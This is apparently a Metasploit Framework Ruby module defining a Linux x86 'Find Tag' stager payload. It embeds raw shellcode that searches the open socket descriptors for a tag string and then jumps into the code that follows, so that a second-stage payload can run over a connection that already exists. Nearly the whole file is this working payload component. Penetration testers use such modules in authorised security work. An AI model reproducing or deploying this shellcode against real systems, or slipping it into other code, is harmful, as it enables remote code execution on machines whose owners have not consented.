##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/find_tag'


###
#
# FindTag
# -------
#
# Linux find tag stager.
#
###
module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Linux

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Find Tag Stager',
			'Description'   => 'Use an established connection',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::FindTag,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'TAG' => [ 0x1a, 'RAW' ],
						},
					'Payload' =>
						"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86\xfb" +
						"\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x6d\x73\x66\x21\x75\xf0" +
						"\x5f\xfc\xad\xff\xe6"
				}
			))
	end

end
